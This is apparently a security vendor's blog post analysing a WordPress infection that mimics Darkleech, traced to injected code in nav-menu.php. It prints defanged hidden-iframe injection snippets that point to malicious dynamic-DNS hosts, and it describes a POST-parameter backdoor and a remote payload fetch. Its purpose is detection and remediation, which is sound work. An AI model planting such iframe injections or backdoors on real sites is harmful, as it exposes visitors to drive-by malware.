@@ -1,0 +1,57 @@
+WordPress Malware Causes Psuedo-Darkleech Infection
+
+Darkleech is a nasty malware infection that infects web servers at the root level. It use malicious Apache modules to insert hidden iframes with certain responses. It’s difficult to detect because the malware is only active when both the server and site admins are not logged in and the iframe is only injected once a day (or once a week in some versions) per IP address. This means that the infection symptoms are difficult to reproduce. Since it’s a server-level infection even the most thorough remote scans won’t reveal anything. Even when the culprit is identified, website owners may not be able to resolve the issue without help of a server administrator.
+Despite the detection difficulties, it was quite easy to tell that the server was infected with Darkleech when we saw the malicious code — it has followed the same recognizable pattern since 2012:
+
+Declaration of a CSS class with a random name and random negative absolute position.
+A div of that class.
+A malicious iframe with random dimensions inside that div.
+
+This is what it looked like back in September of 2012:
+<style>.tlqvepxi { position:absolute; left:-1648px; top:-1752px} </style> <div class="tlqvepxi">
+<iframe src="hxxp://example.com/21234443.html" width="581" height="476"></iframe></div>
+This is the code from November of 2014
+<style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class="syxq9la69">
+<iframe src="hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2" width="285" height="554"></iframe></div>
+Very similar, isn’t it?
+At some point, Darkleech began to use free No-IP dynamic DNS hostnames (random third-level domains on ddnes.net, myftp.org, servepics.com, hopto.org, serveftp.com, etc. ) and this became one of its distinguishing features too.
+New version of Darkleech?
+Recently, we began to notice the following code on some WordPress websites.
+<style>.cznfvc1d54 { position:absolute; left:-1447px; top:-1785px} </style> <div class="cznfvc1d54">
+<iframe src="hxxp:// dhbxnx .serveftp .com/blog/4c2H?utm_source=g86" width="593" height="405"></iframe></div>
+That’s the same pattern, except for the trailing iframe URL part: /blog/4C2H?utm_source=g86.
+It stayed the same on all the sites. The only varying part of the URL paths was the value of the utm_source parameter: utm_source=g86, utm_source=g112, utm_source=g90, utm_source=g98, etc.
+Sometimes the malware was hard to reproduce, but on some sites it was reproducible on every load. What was even stranger is that we saw this on IIS servers (with PHP support) too. We had not heard of Darkleech infecting IIS web servers.
+Malware in nav-menu.php
+Then we had a chance to work with one of the infected websites and found the real source of these “Darkleech iframes”. The culprit was the infected wp-includes/nav-menu.php core WordPress file.
+It had the following injected encrypted code in the middle of it:
+Malware in nav-menu.php
+In this decoded version, we see a backdoor section that allows execution of PHP code passed in the p1 and p2 POST parameters to any blog URL:
+
+… and this section downloads code from a remote dazzer .slyip .com server and injects the downloaded code into web pages:
+Downloading malware from dazzer .slyip .com
+Two Layers of Tests
+Here you can see that there are two layers of tests determining whether to inject malware or not.
+The first layer is in this script. It’s some sort of pre-screening. It makes sure that the requests are not coming from search engine bots or from Google’s network. Also note the commented out line where they used to check for Internet Explorer browsers only — for some reason they removed this condition in the current version.
+The second layer is on the remote server. They pass the following information about every request in the parameters of the URL: hxxp: / /dazzer .slyip .com/ordpm/v2/?export=7f53f8c6c730af6aeb52e66eb74d8507&url=nnnnn&g=ggg :
+
+Domain of the infected site.
+IP address of the visitor.
+Browser of the visitor (user agent).
+Referrer.
+
+It’s clear that this information is used to determine request eligibility. The dazzer .slyip .com can track IP addresses and return the malicious code only once in a certain period of time to requests from the same IP. The IP address also helps with geo-targeting if the attackers are only interested in traffic from certain countries. The user agent string will tell them whether the visitor uses a vulnerable version of a browser that they can attack. The referrer helps them identify visitors who came to the site after clicking on links in search results or on social networks (website owners and webmasters are more likely to use bookmarks rather than search engines).
+If all the requirements are met, the remote server returns a base64-encoded malware to be injected into web pages (since it is in the nav-menu.php it will be at the very top of the HTML code, before the tag). If the request is considered not eligible, then dazzer .slyip .com doesn’t return anything and malware is not being injected.
+Verifying the Injected Payload
+OK, this code is definitely malicious and its behavior is quite typical for PHP malware. But is it really responsible for those Darkleech iframes? Or maybe it’s some different malware and removing it won’t be enough to fix the Darkleech problem. To figure this out, I conducted a very simple test — used the malware code to prepare a complete dazzer .slyip .com URL with all the required parameters and made a request to it from a different server — the response came back with a base64-encoded string, which after decoding looked like this:
+Pseudo-darkleech code from dazzer .slyip .com
+That’s exactly the code that we originally thought belonged to Darkleech. You might have noticed that the utm_source=g112 parameter in the iframe URL matches the g=112 parameter in the dazzer .slyip .com URL. This test proved that the real culprit was the malware inside one of the WordPress files, not a root level web server infection.
+What we see here is malware that uses the same iframe code generation algorithm as we originally noticed in Darkleech: hidden style, div and an iframe inside the hidden div, with all the names and parameters changing on every load. The use of No-IP hostnames is also common with Darkleech. By the way, the dazzer .slyip .com domain also uses a Dynamic DNS service — this time if belongs to DtDNS (at the time of writing it points to 217.172.170.7 – Germany, Hurth Plusserver Ag).
+Remediation
+Unlike a real Darkleech infection, this one is pretty easy to deal with. The malware should be detectable by any security plugin (e.g. Sucuri Security plugin) that checks integrity of core WP files. The easiest way to remove the malware is to replace the infected file with the clean one from the original WordPress package. You can also reinstall WordPress or upgrade it if you are still using an old version.
+Of course, this is only a part of the cleanup process. You will also need to find and remove all the backdoors that hackers might have placed on your server and identify the security hole that was used to break into your site in the first place.
+In case of this attack, you may find backdoors that I showed in the screenshot for the backdoor section above in some random files. They may be core WordPress files or third-party plugin files. Try searching for “passssword” (4 ‘s’ in passssword). We can also see that most compromised sites are using old vulnerable versions of the Slider Revolution (RevSlider) plugin. Update it ASAP, even if it’s a part of a theme! Update all other themes and plugins too.
+We can see that once hackers break into a web site they infect the nav-menu.php files in all the sites that share the same hosting account (they don’t have to have the RevSlider plugin). Moreover, not only WordPress sites can be infected this way. We also see that the attackers inject the same code into the defines.php file of Joomla websites, e.g: includes/defines.php, administrator/includes/defines.php
+Once you remove malware and update software, make sure to change all passwords. You might also want to check if hackers created additional WordPress admin users as suggested in this post. I can’t confirm it always happens, but if a site uses old versions of a plugin that has been actively exploited for more than 6 months now, then the chances are it’s not the first time it has been hacked and it may be affected by multiple unrelated attacks.
+
+For additional pro-active protection we recommend using a website firewall. If you’re currently infected, and need help, you can learn more about our Website Malware Removal Services.
